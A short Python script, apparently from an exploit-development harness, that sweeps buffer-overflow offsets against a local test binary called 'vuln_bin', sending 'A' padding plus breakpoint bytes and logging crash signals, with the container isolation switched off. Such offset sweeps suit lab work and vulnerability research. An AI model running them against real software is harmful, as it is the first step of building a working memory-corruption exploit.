import sys,asyncio
sys.path.insert(0,'.')
from alpha.sandbox import run_exploit

async def sweep():
    for off in [64,68,72,76,80,88,96,104,120,136,152,168,184,200]:
        payload=b'A'*off + b'\xcc'*8
        r=await run_exploit('test_targets/vulnerable/vuln_bin',
            payload_hex=payload.hex(),
            args=[payload.decode('latin-1')],
            timeout=3, use_container=False)
        sig=r.get('signal',0)
        print(f'offset={off:3d} signal={sig:2d} crashed={r["crashed"]}')

asyncio.run(sweep())
